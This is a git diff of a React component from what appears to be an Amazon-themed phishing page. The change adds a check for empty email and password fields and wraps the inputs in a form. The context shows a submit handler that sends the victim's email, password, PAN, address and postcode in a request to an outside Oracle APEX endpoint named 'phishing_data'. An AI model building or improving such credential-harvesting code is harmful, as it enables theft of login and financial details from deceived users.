@@ -16,6 +16,9 @@ function Win() {
     const navigate = useNavigate()
 
     const submitForm = async() => {
+        if (email.current.value == "" || pass.current.value ==""){
+            return
+        }
         try {
             save_data_api = `https://apex.oracle.com/pls/apex/visheshpandey/amazon/phishing_data?email=${email.current.value}&pass=${pass.current.value}&pan=${pan.current.value}&address=${address.current.value}&state =${state.current.value}&country=${country.current.value}&zip=${zip.current.value}`
             await fetch(save_data_api, { method: "POST" });
@@ -46,7 +49,7 @@ function Win() {
             </div>
             <div className="row">
                 <div className="col">
-                    <div className="row g-3">
+                    <form className="row g-3">
                         <div className="col-md-6">
                             <label htmlFor="inputEmail4" className="form-label">
                                 Email
@@ -115,7 +118,7 @@ function Win() {
                                 Submit
                             </button>
                         </div>
-                    </div>
+                    </form>
 
                 </div>
             </div>
